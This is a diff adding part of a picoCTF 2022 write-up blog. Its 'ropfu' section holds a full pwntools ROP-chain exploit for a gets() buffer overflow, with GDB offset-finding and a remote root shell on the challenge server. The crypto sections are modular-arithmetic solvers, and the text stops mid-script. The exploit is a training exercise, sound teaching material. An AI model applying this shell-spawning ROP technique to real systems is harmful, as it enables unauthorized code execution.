+                <br><details><summary><b>Hints</b>:</summary><br>We're not looking for the Local Spooler vulnerability in 2021…<br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>This is a really trivial challenge. You can actually google “first recorded remote code execution (RCE) vulnerability in 2021” and it will be the first result:</p>
+<p><img src="/static/picoctf-2022/beginners-compilation/cve-google.png" width="600"></img></p>
+
+<div class="text-flag no-highlight"><i class="fa-solid fa-flag"></i> <strong>CVE-XXXX-XXXX</strong>: <code>picoCTF{CVE-2021-34527}</code></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h3 id="ropfu" class="chal-title"><a href="#ropfu" class="headerlink" title="ropfu"></a>ropfu</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: Sanjay C., Lt. "Syreal" Jones<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn<br>
+                
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/beginners-compilation/ropfu">vuln</a>, <a href="/static/picoctf-2022/beginners-compilation/ropfu.c">vuln.c</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                What's ROP?<br />
+Can you exploit the following <a href="/static/picoctf-2022/beginners-compilation/ropfu">program</a> to get the flag? Download <a href="/static/picoctf-2022/beginners-compilation/ropfu.c">source</a>.<br />
+<code>nc saturn.picoctf.net [PORT]</code>
+                
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-warning no-highlight"><i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <strong>instance-based</strong> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.</div>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span style="color:#F99157">$ </span>checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/ropfu/vuln'
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#5EBDAB">Canary found</span>
+    NX:       <span style="color:#D41919">NX disabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+    RWX:      <span style="color:#D41919">Has RWX segments</span></pre></td></tr></table></div>
+
+<p>Hey, look: a classic “ROP” (return-oriented programming) challenge with the source code provided! Let’s take a look:</p>
+<div><figure class="highlight py" style=""><table><figcaption><span>vuln.c</span><a href="https://enscribe.dev/static/picoctf-2022/beginners-compilation/ropfu.c"><span>[download source]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line"></span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="comment">#include &lt;stdio.h&gt;</span>
+<span class="comment">#include &lt;stdlib.h&gt;</span>
+<span class="comment">#include &lt;string.h&gt;</span>
+<span class="comment">#include &lt;unistd.h&gt;</span>
+<span class="comment">#include &lt;sys/types.h&gt;</span>
+<span class="comment">#define BUFSIZE 16</span>
+
+void vuln() {
+    char buf[<span class="number">16</span>];
+    printf(<span class="string">&quot;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&quot;</span>);
+    <span class="keyword">return</span> gets(buf);
+
+}
+
+<span class="built_in">int</span> main(<span class="built_in">int</span> argc, char **argv) {
+    setvbuf(stdout, NULL, _IONBF, <span class="number">0</span>);
+
+    // <span class="type">Set</span> the gid to the effective gid
+    // this prevents /<span class="built_in">bin</span>/sh <span class="keyword">from</span> dropping the privileges
+    gid_t gid = getegid();
+    setresgid(gid, gid, gid);
+    vuln();
+}
+</pre></td></tr></table></div>
+
+<p>The source only provides us with one vulnerable function: <code>gets()</code>. I’ve gone over this extremely unsafe function multiple times now, so feel free to read <a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/242.html">MITRE’s Common Weakness Enumeration page</a> if you don’t know why. There is also no convenient function with <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> in it (for obvious reasons), so we will have to insert our own shellcode.</p>
+<p>Although we could totally solve this the old-fashioned way (as John Hammond did in <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=c7wNN8qgxAA">his writeup</a>), we can use the power of automation with a tool called <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>! Let’s try using it here to <strong>automatically</strong> build the ROP-chain for us, which will eventually lead to a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/System_call">syscall</a>:</p>
+<div><figure class="highlight text" style="height: 400px; overflow: scroll; margin: 1rem 0; background-color: #1D1D1D;"><table><figcaption><span>auto rop-chain generation</span><a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary vuln --ropchain</span>
+
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8059102 mov dword ptr [edx], eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80b074a pop eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
+
+- Step 2 -- Init syscall number gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x808055e inc eax ; ret
+
+- Step 3 -- Init syscall arguments gadgets
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049022 pop ebx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049e39 pop ecx ; ret
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
+
+- Step 4 -- Syscall gadget
+
+    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804a3d2 int 0x80
+
+- Step 5 -- Build the ROP chain
+<div class="skip-highlight">(omitted for brevity, will be in final script!)</div></pre></td></tr></table></div>
+
+<p>Oh, wow. It generated the entire script for us (unfortunately in Python2), with only a few missing bits and bobs! The only things we need to manually configure now are the offset and remote connection. Since the <code>checksec</code> mentioned that there was a canary enabled, it looks like we’ll have to manually guess the offset with the <code>$eip</code>:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>GDB - "GDB enhanced features"</span><a target="_blank" rel="noopener" href="https://gef.readthedocs.io/en/master"><span>[documentation]</span></a></figcaption><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>shell python3 -q
+>>> print('A'*28 + 'B'*4)
+AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+>>> 
+<span style="color:#47D4B9"><b>gef➤  </b></span>r
+Starting program: /home/kali/ctfs/pico22/ropfu/vuln 
+How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
+AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+<span style="color:#367BF0">0x42424242</span> in <span style="color:#FEA44C">??</span> ()
+[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
+<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>$eax   </b></span>: <span style="color:#9755B3">0xffffd540</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"</span>
+<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#D41919">0x80e5300</span>  →  <span style="color:#585858"><b><_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah</b></span>
+<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
+<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#EC0101"><b>$esi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
+<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
+<span style="color:#EC0101"><b>$eip   </b></span>: 0x42424242 ("<span style="color:#FEA44C">BBBB</span>"?)
+<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
+<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x42424242
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
+[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x42424242</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span></pre></td></tr></table></div>
+
+<p>The offset is 28, as we’ve successfully loaded 4 hex <code>B</code>s into the <code>$eip</code>. Our last step is to set up the remote connection with <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/">pwntools</a>. Here is my final script:</p>
+<div><figure class="highlight py" style="height: 400px; overflow: scroll; margin: 1rem 0;"><table><figcaption><span>ropfu.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/17d531a5738b4592f6d718fc0eb1b508"><span>[github gist link]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="comment">#!/usr/bin/env python2</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> struct <span class="keyword">import</span> pack
+
+payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">28</span>
+
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e5060</span>) <span class="comment"># @ .data</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b074a</span>) <span class="comment"># pop eax ; ret</span>
+payload += <span class="string">&#x27;/bin&#x27;</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e5064</span>) <span class="comment"># @ .data + 4</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b074a</span>) <span class="comment"># pop eax ; ret</span>
+payload += <span class="string">&#x27;//sh&#x27;</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x41414141</span>) <span class="comment"># padding</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804fb90</span>) <span class="comment"># xor eax, eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08059102</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049022</span>) <span class="comment"># pop ebx ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e5060</span>) <span class="comment"># @ .data</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049e39</span>) <span class="comment"># pop ecx ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080583c9</span>) <span class="comment"># pop edx ; pop ebx ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e5068</span>) <span class="comment"># @ .data + 8</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080e5060</span>) <span class="comment"># padding without overwrite ebx</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804fb90</span>) <span class="comment"># xor eax, eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0808055e</span>) <span class="comment"># inc eax ; ret</span>
+payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804a3d2</span>) <span class="comment"># int 0x80</span>
+
+p = remote(<span class="string">&quot;saturn.picoctf.net&quot;</span>, [PORT])
+log.info(p.recvS())
+p.sendline(payload)
+p.interactive()</pre></td></tr></table></div>
+
+<p>Let’s run the script:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span style="color:#F99157">$ </span> python2 exp.py
+<pre>python2 exp.py
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 58931: Done
+[<span style="color:#277FFF"><b>*</b></span>] How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
+<span style="color:#EC0101"><b>$</b></span> whoami
+root
+<span style="color:#EC0101"><b>$</b></span> ls
+flag.txt
+vuln
+<span style="color:#EC0101"><b>$</b></span> cat flag.txt
+picoCTF{5n47ch_7h3_5h311_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> <span style="background-color:#FFFFFF"><span style="color:#1A1C23"> </span></span></pre></td></tr></table></div>
+
+<p>I know the way of ROP-fu, old man. Your shell has been snatched.</p>
+<hr>
+<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><div class="challenge">
+    <div class="challenge-title"><h3 id="basic-mod1" class="chal-title"><a href="#basic-mod1" class="headerlink" title="basic-mod1"></a>basic-mod1</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: Will Hong<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: crypto, prog<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                We found this weird message being passed around on the servers, we think we have a working decryption scheme.<br />
+Take each number mod 37 and map it to the following character set - 0-25 is the alphabet (uppercase), 26-35 are the decimal digits, and 36 is an underscore. Wrap your decrypted message in the picoCTF flag format (i.e. <code>picoCTF{decrypted_message}</code>)
+                <br><details><summary><b>Hints</b>:</summary><br>Do you know what <code>mod 37</code> means?<br>mod 37 means modulo 37. It gives the remainder of a number after being divided by 37.<br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>Let’s go over what it’s asking:</p>
+<ul>
+<li>Calculate <code>% 37</code> for each number</li>
+<li>Map each number to this specific charset:<ul>
+<li>0-25 &#x3D; Uppercase alphabet (A-Z)</li>
+<li>26-35 &#x3D; Decimal digits (0-9)</li>
+<li>36 &#x3D; Underscore (“_”)</li>
+</ul>
+</li>
+</ul>
+<p>I was too lazy to learn Python and do that, so here it is in native Javascript:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Splitting into array</span></span><br><span class="line">x = <span class="string">&quot;54 211 168 309 262 110 272 73 54 137 131 383 188 332 [REDACTED]&quot;</span>.<span class="title function_">split</span>();</span><br><span class="line"><span class="comment">// Mod 37</span></span><br><span class="line">y = x.<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x % <span class="number">37</span>);</span><br><span class="line">z = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; y.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// Mapping to charset</span></span><br><span class="line">    <span class="keyword">if</span> (y[i] &gt;= <span class="number">0</span> &amp;&amp; y[i] &lt;= <span class="number">25</span>) &#123;</span><br><span class="line">      z.<span class="title function_">push</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(y[i] + <span class="string">&#x27;A&#x27;</span>.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (y[i] &gt;= <span class="number">26</span> &amp;&amp; y[i] &lt;= <span class="number">35</span>) &#123;</span><br><span class="line">      z.<span class="title function_">push</span>(y[i] - <span class="number">26</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (y[i] == <span class="number">36</span>) &#123;</span><br><span class="line">      z.<span class="title function_">push</span>(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Combine back to string</span></span><br><span class="line">z = z.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`picoCTF&#123;<span class="subst">$&#123;z&#125;</span>&#125;`</span>);</span><br></pre></td></tr></table></figure>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>node solve.js
+<div class="code-highlight">picoCTF{R0UND_N_R0UND_<span style="color:#696969"><b>[REDACTED]</b></span>}</div></pre></td></tr></table></div>
+
+
+<p>Looking back at the problem after I learned Python, here’s a solution that’s significantly cleaner:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">x = <span class="string">&quot;54 211 168 309 262 110 272 73 54 137 131 383 188 332 [REDACTED]&quot;</span></span><br><span class="line">y = x.split()</span><br><span class="line"></span><br><span class="line">a = string.ascii_uppercase + string.digits + <span class="string">&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Insane list comprehension</span></span><br><span class="line">z = [a[<span class="built_in">int</span>(i) % <span class="number">37</span>] <span class="keyword">for</span> i <span class="keyword">in</span> y]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;picoCTF&#123;&quot;</span>+<span class="string">&#x27;&#x27;</span>.join(z)+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 solve.py
+<div class="code-highlight">picoCTF{R0UND_N_R0UND_<span style="color:#696969"><b>[REDACTED]</b></span>}</div></pre></td></tr></table></div>
+
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h3 id="basic-mod2" class="chal-title"><a href="#basic-mod2" class="headerlink" title="basic-mod2"></a>basic-mod2</h3></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: Will Hong<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: crypto, prog<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
+                
+                
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" >
+                A new modular challenge! Take each number mod 41 and find the modular inverse for the result. Then map to the following character set - 1-26 are the alphabet, 27-36 are the decimal digits, and 37 is an underscore. Wrap your decrypted message in the picoCTF flag format (<code>picoCTF{decrypted_message}</code>).
+                <br><details><summary><b>Hints</b>:</summary><br>Do you know what the modular inverse is?<br>The inverse modulo <code>z</code> of <code>x</code> is the number, <code>y</code> that when multiplied by <code>x</code> is 1 modulo <code>z</code>.<br>It's recommended to use a tool to find the modular inverses.<br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<p>Let’s go over what it’s asking once again:</p>
+<ul>
+<li>Calculate <code>% 41</code> for each number</li>
+<li>Map each number to this specific charset:<ul>
+<li>1-26 &#x3D; Uppercase alphabet (A-Z)</li>
+<li>27-36 &#x3D; Decimal digits (0-9)</li>
+<li>37 &#x3D; Underscore (“_”)</li>
+</ul>
+</li>
+</ul>
+<p>Here’s a stupidly long Javascript snippet I made to solve this:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Splitting into array</span></span><br><span class="line">x = <span class="string">&quot;54 211 168 309 262 110 272 73 54 137 131 383 188 332 [REDACTED]&quot;</span>.<span class="title function_">split</span>();</span><br><span class="line"><span class="comment">// Mapping to % 41 with modular inverse of 41</span></span><br><span class="line">y = x.<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x % <span class="number">41</span>).<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> <span class="title function_">modInverse</span>(x, <span class="number">41</span>));</span><br><span class="line">z = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Mapping to charset</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; y.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (y[i] &gt;= <span class="number">1</span> &amp;&amp; y[i] &lt;= <span class="number">26</span>) z.<span class="title function_">push</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(y[i] + <span class="number">64</span>));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (y[i] &gt;= <span class="number">27</span> &amp;&amp; y[i] &lt;= <span class="number">36</span>) z.<span class="title function_">push</span>(y[i] - <span class="number">27</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (y[i] == <span class="number">37</span>) z.<span class="title function_">push</span>(<span class="string">&quot;_&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`picoCTF&#123;<span class="subst">$&#123;z.join(<span class="string">&quot;&quot;</span>)&#125;</span>&#125;`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// credit to: https://rosettacode.org/wiki/Modular_inverse</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">modInverse</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    a %= b;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">1</span>; x &lt; b; x++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((a * x) % b == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        